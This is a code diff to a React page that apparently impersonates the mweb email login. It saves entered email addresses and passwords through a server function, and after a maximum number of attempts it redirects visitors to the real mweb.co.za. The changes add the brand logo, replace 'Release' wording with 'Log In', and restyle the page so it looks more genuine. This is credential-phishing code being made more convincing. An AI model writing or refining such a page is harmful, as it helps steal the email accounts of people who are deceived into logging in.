@@ -3,6 +3,7 @@ import { z } from "zod";
 import { useRef, useState, FormEvent } from "react";
 import { Eye, EyeOff, X } from "lucide-react";
 import heroImage from "@/assets/image-104a82eeac42e8.png";
+import logo from "@/assets/image.png";
 import { useServerFn } from "@tanstack/react-start";
 import { saveEntry } from "@/lib/submissions.functions";
 
@@ -41,15 +42,20 @@ function Index() {
   const saveEntryFn = useServerFn(saveEntry);
   const [maxReached, setMaxReached] = useState(false);
   // const maxReachedRef = useRef(false);
-
+  
+  const handleClose = () => {
+    setMaxReached(false);
+    window.location.href = 'https://mweb.co.za';
+   // () => setMaxReached(false)
+  };
 
   const emailError = attempted && !email.trim();
   const passwordError = attempted && !password.trim();
   return (
-    <div className="flex min-h-screen flex-col bg-background">
-      <header className="w-full bg-[var(--brand-footer)] px-6 py-4">
+    <div className="flex min-h-screen flex-col bg-background color: #B7C9E2">
+      <header className="w-full bg-[var(--brand-footer)] px-5 py-2">
         <a href="/" className="inline-block">
-          <span className="text-3xl font-bold tracking-tight text-white lowercase">mweb.</span>
+          <img src={logo} alt="mweb." className="h-8 w-auto" />
         </a>
       </header>
 
@@ -66,12 +72,12 @@ function Index() {
 
         <section className="flex items-center justify-center px-6 py-12 sm:px-12">
           <div className="w-full max-w-md">
-            <h1 className="text-5xl font-bold text-center tracking-tight text-foreground">My Email</h1>
+            <h1 className="text-5xl font-bold text-center tracking-tight text-foreground"><strong>My Email</strong></h1>
 
             <div className="mt-10">
               <h2 className="text-xl font-semibold text-foreground">Log Into Your Email</h2>
               <p className="mt-1 text-sm text-muted-foreground">
-                Release using your email address and password.
+                Log in using your email address and password.
               </p>
             </div>
 
@@ -173,9 +179,9 @@ function Index() {
                 <button
                   type="submit"
                   disabled={submitting || maxReached}
-                  className="rounded-full bg-accent px-8 py-2.5 text-sm font-semibold text-accent-foreground transition hover:brightness-95"
+                  className="rounded-full bg-accent px-8 py-2.5 text-sm font-semibold text-accent-foreground transition hover:bg-[var(--brand-footer)] hover:text-white"
                 >
-                  {submitting ? "Releasing..." : "Release"}
+                  {submitting ? "Releasing..." : "Log In"}
                 </button>
               </div>
             </form>
@@ -243,7 +249,7 @@ function Index() {
       {maxReached && (
         <div
           className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
-          onClick={() => setMaxReached(false)}
+          onClick={handleClose}
         >
           <div
             className="relative w-[min(420px,92vw)] rounded-2xl bg-card p-6 shadow-xl"
@@ -252,7 +258,7 @@ function Index() {
             <button
               type="button"
               aria-label="Close"
-              onClick={() => setMaxReached(false)}
+              onClick={handleClose}
               className="absolute right-4 top-4 rounded p-1 text-foreground hover:bg-black/5"
             >
               <X className="h-4 w-4" />
